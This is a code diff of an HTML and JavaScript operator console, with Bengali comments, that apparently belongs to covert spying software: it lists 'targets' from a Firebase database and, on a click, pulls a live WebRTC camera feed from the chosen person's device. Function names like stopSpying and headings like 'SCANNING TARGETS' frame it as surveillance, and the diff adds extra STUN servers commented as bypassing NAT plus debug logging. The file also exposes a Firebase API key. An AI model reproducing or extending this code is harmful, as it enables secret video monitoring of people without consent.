@@ -3,59 +3,53 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Spy Master Control</title>
+    <title>Spy Monitor - Debug Mode</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <script src="https://unpkg.com/simple-peer@9.11.1/simplepeer.min.js"></script>
     <style>
-        body { background: #0f0f0f; color: white; font-family: 'Courier New', monospace; padding: 20px; }
-        h2 { color: #00ffcc; text-align: center; border-bottom: 2px solid #333; padding-bottom: 10px; letter-spacing: 2px; }
+        body { background: #000; color: #0f0; font-family: monospace; padding: 10px; text-align: center; }
         
+        /* ডিবাগ লগ (স্ক্রিনে লেখা উঠবে) */
+        #debugLog { 
+            background: #111; border: 1px solid #333; color: yellow; 
+            padding: 10px; margin: 10px auto; width: 90%; height: 100px; 
+            overflow-y: scroll; text-align: left; font-size: 10px;
+        }
+
         #userList { list-style: none; padding: 0; }
         .user-card { 
-            background: #1a1a1a; padding: 15px; margin: 10px 0; border-radius: 5px; 
+            background: #222; border: 1px solid #444; padding: 10px; margin: 5px 0; 
             cursor: pointer; display: flex; justify-content: space-between; 
-            border: 1px solid #333; transition: 0.3s; 
         }
-        .user-card:hover { background: #252525; border-color: #00ffcc; transform: translateX(5px); }
+        .online { color: #0f0; font-weight: bold; }
         
-        .status-badge { font-size: 12px; padding: 4px 10px; border-radius: 12px; font-weight: bold; }
-        .online { background: #00ffcc; color: black; box-shadow: 0 0 10px #00ffcc; }
-        .offline { background: #444; color: #aaa; }
-
-        /* পপ-আপ ভিডিও প্লেয়ার */
         #videoContainer { 
             display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
-            background: rgba(0,0,0,0.96); z-index: 999; text-align: center; padding-top: 40px; 
+            background: black; z-index: 999; flex-direction: column; 
+            align-items: center; justify-content: center;
         }
-        /* ভিডিও ট্যাগে বর্ডার এবং শ্যাডো */
-        video { width: 95%; max-width: 600px; border: 3px solid #00ffcc; border-radius: 10px; box-shadow: 0 0 30px rgba(0,255,204,0.4); }
         
-        .btn-close { 
-            padding: 12px 30px; background: red; color: white; border: none; 
-            font-weight: bold; cursor: pointer; margin-top: 15px; border-radius: 5px; font-size: 16px;
-        }
+        video { width: 100%; max-width: 600px; border: 2px solid #0f0; background: #222; }
+        .btn-close { background: red; color: white; padding: 10px 20px; border: none; margin-top: 10px; font-weight: bold; }
     </style>
 </head>
 <body>
 
-    <h2>🕵️ MASTER CONTROL v3.0</h2>
-    <p style="text-align: center; color: #666;">Scanning global targets...</p>
+    <h3>📡 SCANNING TARGETS...</h3>
+    
+    <div id="debugLog">System Ready...</div>
 
-    <h3>Active Targets:</h3>
     <ul id="userList"></ul>
 
     <div id="videoContainer">
-        <h3 id="targetName" style="color: #00ffcc;">Connecting...</h3>
-        
-        <video id="remoteVideo" autoplay playsinline muted controls></video>
-        
-        <br>
-        <button class="btn-close" onclick="stopSpying()">DISCONNECT</button>
+        <h3 id="statusTitle" style="color: #0f0;">Connecting...</h3>
+        <video id="remoteVideo" autoplay playsinline muted></video>
+        <button class="btn-close" onclick="stopSpying()">CLOSE CONNECTION</button>
     </div>
 
     <script>
-        // তোর কনফিগারেশন
+        // ১. তোর কনফিগারেশন
         const firebaseConfig = {
           apiKey: "AIzaSyBy5AGDGQFZqbL83fKQfLViX_pyOu6AJ38",
           authDomain: "phone-f605e.firebaseapp.com",
@@ -67,50 +61,44 @@
           measurementId: "G-WSJDCYKM3F"
         };
 
-        if (!firebase.apps.length) {
-            firebase.initializeApp(firebaseConfig);
+        function log(msg) {
+            const logBox = document.getElementById("debugLog");
+            logBox.innerHTML += `> ${msg}<br>`;
+            logBox.scrollTop = logBox.scrollHeight;
+            console.log(msg);
         }
+
+        if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
         const db = firebase.database();
-        
         let currentPeer = null;
         let currentTargetId = null;
 
-        // --- ইউজার লিস্ট লোড ---
+        // ২. ইউজার লিস্ট লোড
         db.ref("users").on("value", snapshot => {
             const list = document.getElementById("userList");
             list.innerHTML = "";
-            
             snapshot.forEach(child => {
                 const uid = child.key;
                 const data = child.val();
-                
                 const isOnline = data.status === "online";
-                const email = data.email || "Unknown Target";
-
+                
                 const li = document.createElement("li");
                 li.className = "user-card";
-                li.innerHTML = `
-                    <span>👤 ${email.split('@')[0]}</span> 
-                    <span class="status-badge ${isOnline ? 'online' : 'offline'}">${data.status.toUpperCase()}</span>
-                `;
+                li.innerHTML = `<span>${data.email.split('@')[0]}</span> <span class="${isOnline?'online':''}">${isOnline?'● ONLINE':'○ OFFLINE'}</span>`;
                 
-                if(isOnline) {
-                    li.onclick = () => prepareConnection(uid, email);
-                } else {
-                    li.style.opacity = "0.5";
-                    li.style.cursor = "not-allowed";
-                }
+                if(isOnline) li.onclick = () => prepareConnection(uid, data.email);
                 list.appendChild(li);
             });
         });
 
-        // --- কানেকশন লজিক ---
+        // ৩. কানেকশন শুরু
         function prepareConnection(uid, email) {
-            document.getElementById("videoContainer").style.display = "block";
-            document.getElementById("targetName").innerText = "Handshaking with " + email + "...";
+            document.getElementById("videoContainer").style.display = "flex";
+            document.getElementById("statusTitle").innerText = "Target: " + email;
+            log("Starting connection process...");
             currentTargetId = uid;
 
-            // ১. আগের সব সিগন্যাল ডিলিট (ক্লিন স্লেট)
+            // ক্লিনআপ
             db.ref("users/" + uid + "/offer").remove();
             db.ref("users/" + uid + "/answer").remove().then(() => {
                 startWebRTC(uid);
@@ -118,47 +106,74 @@
         }
 
         function startWebRTC(targetId) {
+            log("Initializing Peer...");
+            
+            // 🔥 পাওয়ারফুল সার্ভার লিস্ট (NAT বাইপাস করার জন্য)
             currentPeer = new SimplePeer({ 
                 initiator: true, 
                 trickle: false,
-                config: { iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] } 
+                config: { 
+                    iceServers: [
+                        { urls: 'stun:stun.l.google.com:19302' },
+                        { urls: 'stun:stun1.l.google.com:19302' },
+                        { urls: 'stun:stun2.l.google.com:19302' },
+                        { urls: 'stun:global.stun.twilio.com:3478' }
+                    ] 
+                } 
             });
 
+            // সিগন্যাল পাঠানো
             currentPeer.on('signal', offer => {
+                log("Signal Generated. Sending to Database...");
                 db.ref("users/" + targetId + "/offer").set(offer);
             });
 
+            // উত্তর রিসিভ করা
             db.ref("users/" + targetId + "/answer").on("value", snapshot => {
                 const answer = snapshot.val();
-                if (answer && currentPeer) {
+                if (answer && currentPeer && !currentPeer.connected) {
+                    log("Answer Received from User!");
                     currentPeer.signal(answer);
                 }
             });
 
+            // কানেকশন স্ট্যাটাস চেক
+            currentPeer.on('connect', () => {
+                log("✅ P2P CONNECTION ESTABLISHED!");
+                document.getElementById("statusTitle").innerText = "CONNECTED! Waiting for video...";
+            });
+
+            // 🔥 ভিডিও স্ট্রিম আসলে
             currentPeer.on('stream', stream => {
+                log("🎥 VIDEO STREAM ARRIVED!");
                 const video = document.getElementById("remoteVideo");
-                video.srcObject = stream;
-                document.getElementById("targetName").innerText = "🔴 LIVE FEED: " + targetId;
+                
+                if ("srcObject" in video) {
+                    video.srcObject = stream;
+                } else {
+                    video.src = window.URL.createObjectURL(stream);
+                }
+                
+                video.onloadedmetadata = () => {
+                    log("Video Metadata Loaded. Playing...");
+                    video.play().catch(e => log("Autoplay Error: " + e));
+                };
             });
 
             currentPeer.on('error', err => {
-                console.log(err);
-                alert("Connection failed. Target might have disconnected.");
+                log("❌ ERROR: " + err);
+                alert("Connection Error: " + err);
+            });
+            
+            currentPeer.on('close', () => {
+                log("Connection Closed.");
                 stopSpying();
             });
         }
 
         function stopSpying() {
             if (currentPeer) currentPeer.destroy();
-            currentPeer = null;
-            
-            if (currentTargetId) {
-                db.ref("users/" + currentTargetId + "/offer").remove();
-                db.ref("users/" + currentTargetId + "/answer").remove();
-            }
-            
-            document.getElementById("videoContainer").style.display = "none";
-            location.reload(); // ক্লিন থাকার জন্য পেজ রিলোড
+            location.reload();
         }
     </script>
 </body>
